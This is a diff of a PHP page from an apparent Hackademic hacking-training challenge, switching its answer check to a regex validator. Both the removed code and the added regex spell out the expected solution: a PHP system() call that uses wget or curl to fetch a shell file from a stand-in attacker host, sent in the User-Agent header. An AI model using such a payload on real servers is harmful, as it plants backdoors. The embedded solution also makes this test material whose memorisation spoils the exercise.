@@ -45,87 +45,45 @@ One of their most important attacks was when they tampered with the data stored 
 error_reporting(0);
 $shiz = $_REQUEST['source'];
 $page = $_REQUEST['page'];
-			include_once dirname(__FILE__).'/../../init.php';
-			session_start();
-			require_once(HACKADEMIC_PATH."pages/challenge_monitor.php");
-			$monitor->update(CHALLENGE_INIT,$_GET);
 
-if((!isset($shiz)) && (!isset($page))){
-     echo '
-	 <html>
-	 <head>
-	 </head>
-	 <form method="POST" action="'.$_SERVER['PHP_SELF'].'">
-	 View comments of
-	 <select name="file">
-	 <option value="hackers_comments.txt">Hackers Group</option>
-	 <option value="people_comments.txt">Common People</option>
-	 </select>
-	 <input type="submit" value="Submit"/>
-	 </form>';
+include_once dirname(__FILE__).'/../../init.php';
+session_start();
+require_once(HACKADEMIC_PATH."controller/class.ChallengeValidatorController.php");
 
-     if(isset($_POST['file']))
-     {
-	     if($_POST['file']=="hackers_comments.txt")
-	     {
-			echo'<font color=yellow>Hackers Comments:</font><br/> 1.We have proved our ability.We always show how vulnerabale applications are.<br/>2. If Govt. is really serious,it should concentrate on improving security,not arresting us.';   
-	     echo '<br/>';
-//			        $monitor->update(CHALLENGE_FAILURE);
-	     }
+$solution = new RegexSolution(RegexSolution::PHP_BEGIN.'system\("(wget|curl) http:\/\/www.really_nasty_hacker.com\/shell.txt"\)'.RegexSolution::PHP_END);
+$validator = new ChallengeValidatorController($solution);
+$validator->startChallenge();
 
-	     else if($_POST['file']=="people_comments.txt")
-	     {
-			echo '<font color=yellow>Comments of people:</font><br/> 1.Ohh, Govt. and banks are risking our money and privacy.We always pay taxes,other fee but they always act irresponsible resulting these kind of incidents.';
-	     echo '<br/>';
-//			        $monitor->update(CHALLENGE_FAILURE);
-	     }
+if(!isset($shiz) && !isset($page)) {
 
-	     else if($_POST['file']=="http://www.really_nasty_hacker.com/shell.txt")
-	     {
-			echo "The backdoor shell has been successfully installed in target. For security reasones renamed automaticaly to tyj0rL.php</font>";
-	     }
-     }
-     echo '
-<br>
-<font color=red> Enter your comment:</font><br>
-	 <form method="GET" action="'.$_SERVER['PHP_SELF'].'">
-	 <font color=yellow>Name:</font><br>
-	 <input type="text" name="name"><br>
-	 <font color=yellow>Last Name:</font><br>
-	 <input type="text" name="surname"><br>
-	 <font color=yellow>Comment:</font><br>
-	 <textarea name="source" cols="60" rows="15"></textarea>
-	 <br/>
-	 <input type="submit" value="Send">
-	 <input type="hidden" value="answer.php" name="page">
-	 </form>
-	 </body>
-	 </html>';
-}else{
-	if ($page == "answer.php"){
-		 	//$ua = $_SERVER['HTTP_USER_AGENT'];
+?>
+<form method="GET" action="'.$_SERVER['PHP_SELF'].'">
+	<font color=yellow>Name:</font><br>
+	<input type="text" name="name"><br>
+	<font color=yellow>Last Name:</font><br>
+	<input type="text" name="surname"><br>
+	<font color=yellow>Comment:</font><br>
+	<textarea name="source" cols="60" rows="15"></textarea>
+	<br/>
+	<input type="submit" value="Send">
+	<input type="hidden" value="answer.php" name="page">
+</form>
 
-			$lfi = '<?system("wget http://www.really_nasty_hacker.com/shell.txt");?>';
-			if ($_SERVER['HTTP_USER_AGENT'] === $lfi)
-			{
-				echo "The backdoor shell has been successfully installed in target. For security reasones renamed automaticaly to tyj0rL.php</font>";
-				$monitor->update(CHALLENGE_SUCCESS);
-			}
-			//elseif (preg_match("/-O (.*).php/",$ua))
-			//{
-			//	echo "&#932;&#959; backdoor shell &#949;&#947;&#954;&#945;&#964;&#945;&#963;&#964;&#940;&#952;&#951;&#954;&#949; &#949;&#960;&#953;&#964;&#965;&#967;&#974;&#962; &#963;&#964;&#959; &#963;&#964;&#972;&#967;&#959;.<br>&#915;&#953;&#945; &#955;&#972;&#947;&#959;&#965;&#962; &#945;&#963;&#966;&#945;&#955;&#949;&#943;&#945;&#962; (&#960;&#945;&#961;&#940; &#964;&#951;&#957; &#959;&#957;&#959;&#956;&#945;&#963;&#943;&#945; &#960;&#959;&#965; &#964;&#959;&#965; &#948;&#974;&#963;&#945;&#964;&#949;) &#956;&#949;&#964;&#959;&#957;&#959;&#956;&#940;&#963;&#964;&#951;&#954;&#949; 			&#945;&#965;&#964;&#972;&#956;&#945;&#964;&#945; <font color=red>tyj0rL.php</font>";
-			//}
-			else
-			{
-			        $monitor->update(CHALLENGE_FAILURE);
-				echo '<font face="arial" size="3">The registration of your comment was completed with success!<br> In order to be "viewable" should first becomes acceptable from the administration team of the SlagOFF.com';
-			}
+<?php
+
+} else if ($page == 'answer.php') {
+	$answer = $_SERVER['HTTP_USER_AGENT'];
+	$valid = $validator->validateSolution($answer);
+	if ($valid) {
+		echo 'The backdoor shell has been successfully installed in target. For security reasones renamed automaticaly to tyj0rL.php</font>';
+	} else {
+		echo '<font face="arial" size="3">The registration of your comment was completed with success!<br> In order to be "viewable" should first becomes acceptable from the administration team of the SlagOFF.com';
 	}
-
-
 }
 
 ?>
 <hr>
 <center>
 </center>
+</body>
+</html>
